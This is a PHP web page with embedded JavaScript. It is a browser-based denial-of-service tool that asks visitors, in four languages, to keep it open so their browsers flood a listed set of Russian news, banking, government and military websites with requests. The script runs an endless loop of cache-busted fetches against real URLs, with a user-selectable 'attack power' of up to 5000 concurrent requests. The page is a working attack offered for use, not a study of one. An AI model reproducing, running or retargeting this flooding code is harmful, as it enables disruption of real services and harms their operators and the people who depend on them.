<?php
header('Content-Type: text/html; charset=utf-8');
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache")
?>
<head>
    <title>Russia MUST BE STOPPED! FUCK U RUSSIA</title>
</head>
<body>
<h1>Russia MUST BE STOPPED!</h1>
<table style="width: 100%">
    <tr>
        <td style="width: 25%">
            <h3>Česká verze</h3>
            <p>„Oficiální“ zpravodajství ruské federace lže a my věříme, že je lepší ji vypnout. Pojďme s nimi shodit i
                bankovní stránky.</p>
            <p>Nechte otevřenou tuto stránku ve svém prohlížeči a váš prohlížeč bude opakovaně dotazovat weby ze seznamu
                níže a tím dojde k vyskému zatížení jejich serverů</p>
            <p>Váš počítač se díky této stránce zpomalí. Je to z důvodu útoku na ruské stránky. Takže je to v pořádku.
                Pokud potřebujete rychlost, stačí stránku zavřít a pak opět spustit. 🙏</p>
        </td>
        <td style="width: 25%">
            <h3>English version</h3>
            <p>The "official" news in russian federation are all fake and we believe it is better to shut them down! And
                let's take bank websites and govermental websites down together with it.</p>
            <p>Please, just open this page and let it be open on your devices, it will flood the web-sites and pose a
                huge load on their infrastructure</p>
            <p>You computer will be slowed down by this page. It is OK because it proccessing the attak. If you need
                speed of your computer lets to close the page and later open it again. 🙏</p>
        </td>
        <td style="width: 25%">
            <h3>Русская версия</h3>
            <p>«Официальные» новости в РФ полны пропаганды и транслируют лживую информацию о
                событиях на Украине. Мы считаем, что лучше их закрыть и позволить людям
                переключиться на достоверные новости.</p>
            <p>Пожалуйста, откройте эту страницу на ваших устройствах. Это зальёт российские
                пропагандистские сайты запросами и создаст огромную нагрузку на их
                инфраструктуру.</p>
            <p>Ваш браузер будет работать медленно. Все в порядке, не волнуйтесь и держите его
                открытым. 🙏</p>
        </td>
        <td style="width: 25%">
            <h3>Українська версія</h3>
            <p>«Офіційні» новини в РФ сповнені пропаганди та транслюють брехливу інформацію про
                події в Україні. Ми вважаємо, що краще їх закрити та дозволити людям переключитися
                на достовірні новини.</p>
            <p>Будь ласка, відкрийте цю сторінку на вашому пристрої. Це закидає російські
                пропагандистські сайти запитами та створить величезне навантаження на їхню
                інфраструктуру.</p>
            <p>Ваш браузер працюватиме повільно. Все гаразд, не хвилюйтеся та тримайте його
                відкритим. 🙏</p>
        </td>
    </tr>
    <tr>
        <td colspan="4">Síla útoku | Attack power | Сила атаки | Сила атаки</td>
    </tr>
    <tr>
        <td colspan="4">
            <input type="radio" name="power" id="low" /><label for="low">Slabí | Low | низкий | низький</label><br />
            <input type="radio" name="power" id="middle" checked="checked" /><label for="middle">Střední | Middle | Середина | Середній</label><br />
            <input type="radio" name="power" id="high" /><label for="high">Silný | High | Сильный | Сильний</label><br />
            <input type="radio" name="power" id="full" /><label for="full">Nejsilnější | Full | Полный | Повний</label><br />
            <input type="radio" name="power" id="extreme" /><label for="extreme">Extrémní | Extreme | Экстрим | Екстремальний</label><br />
        </td>
    </tr>
</table>
<p>If you missed it, <a href="https://www.bbc.com/news/world-europe-60503037">BBC NEWS: Ukraine conflict: Russian forces
        attack from three sides</a></p>
<h3>Here is the stats of your session (the links and the number of the requests that were sent from your browser):</h3>
<div id="stats"></div>
<div id="errors"></div>
</body>
<script>
    var targets = {
        'https://lenta.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
        'https://ria.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
        'https://ria.ru/lenta/': {number_of_requests: 0, number_of_errored_responses: 0},
        'https://www.rbc.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
        'https://www.rt.com/': {number_of_requests: 0, number_of_errored_responses: 0},
        'http://kremlin.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
        'http://en.kremlin.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
        'https://smotrim.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
        'https://tass.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
        'https://tvzvezda.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
        'https://vsoloviev.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
        'https://www.1tv.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
        'https://www.vesti.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
        'https://online.sberbank.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
        'https://sberbank.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
        'http://government.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
        'https://www.cbr.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
        'https://www.vtb.com/': {number_of_requests: 0, number_of_errored_responses: 0},
        'https://www.gazprombank.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
        'http://alfabank.com/': {number_of_requests: 0, number_of_errored_responses: 0},
        'https://www.psbank.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
        'https://www.open.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
        'https://www.rshb.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
        'https://www.unicreditbank.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
        'https://www.raiffeisen.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
        'https://www.rosbank.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
        'https://yandex.ru': {number_of_requests: 0, number_of_errored_responses: 0},
        'https://mail.ru': {number_of_requests: 0, number_of_errored_responses: 0},
        'https://gosuslugi.ru': {number_of_requests: 0, number_of_errored_responses: 0},
        'https://eng.mil.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
        'https://mil.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
        'https://rkn.gov.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
        'http://www.gov.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
        'https://eais.rkn.gov.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
        'http://duma.gov.ru/': {number_of_requests: 0, number_of_errored_responses: 0},
        'https://tourism.gov.ru/': {number_of_requests: 0, number_of_errored_responses: 0}

    }

    var statsEl = document.getElementById('stats');

    function printStats() {
        statsEl.innerHTML = '<table><thead><tr><th style="text-align: left; width: 250px">URL</th><th style="text-align: left">Number of Requests</th><th style="text-align: left">Number of Errors</th></tr></thead><tbody>' + Object.entries(targets).map(([target, {
            number_of_requests,
            number_of_errored_responses
        }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>';
    }

    setInterval(printStats, 1000);

    var CONCURRENCY_LIMIT = 500
    var queue = []

    async function fetchWithTimeout(resource, options) {
        const controller = new AbortController();
        const id = setTimeout(() => controller.abort(), options.timeout);
        return fetch(resource, {
            signal: controller.signal
        }).then((response) => {
            clearTimeout(id);
            return response;
        }).catch((error) => {
            clearTimeout(id);
            throw error;
        });
    }

    async function flood(target) {
        for (var i = 0; ; ++i) {
            if (queue.length > CONCURRENCY_LIMIT) {
                for (var j = 0; queue.length > CONCURRENCY_LIMIT+1; j++) {
                    await queue.shift()
                }
            }
            rand = i % 13 === 0 ? '' : ('?' + Math.floor(Math.random() * 1000))
            queue.push(
                fetchWithTimeout(target + rand, {timeout: 500})
                    .catch((error) => {
                        if (error.code === 20 /* ABORT */) {
                            return;
                        }
                        targets[target].number_of_errored_responses++;
                        targets[target].error_message = error.message
                    })
                    .then((response) => {
                        if (response && !response.ok) {
                            targets[target].number_of_errored_responses++;
                            targets[target].error_message = response.statusText
                        }
                        targets[target].number_of_requests++;
                    })
            )
        }
    }

    function shuffle(array) {
        let currentIndex = array.length, randomIndex;

        // While there remain elements to shuffle...
        while (currentIndex != 0) {

            // Pick a remaining element...
            randomIndex = Math.floor(Math.random() * currentIndex);
            currentIndex--;

            // And swap it with the current element.
            [array[currentIndex], array[randomIndex]] = [
                array[randomIndex], array[currentIndex]];
        }

        return array;
    }

    // Start
    var destinations = shuffle(Object.keys(targets))
     destinations.map(flood)

    var element = document.getElementsByName('power')
    for (var i=element.length; i--;) {
        element[i].addEventListener('click', changePower, false)
    }

    function changePower() {
        console.log('Changing power to ' + this.id + '.')
        switch (this.id) {
            case 'low':
                CONCURRENCY_LIMIT = 50
                break;
            case 'middle':
                CONCURRENCY_LIMIT = 300
                break;
            case 'high':
                CONCURRENCY_LIMIT = 800
                break;
            case 'full':
                CONCURRENCY_LIMIT = 1600
                break;
            case 'extreme':
                CONCURRENCY_LIMIT = 5000
                break;
        }
        console.log('Power changed to ' + CONCURRENCY_LIMIT + ' concurrence requests.')
    }


</script>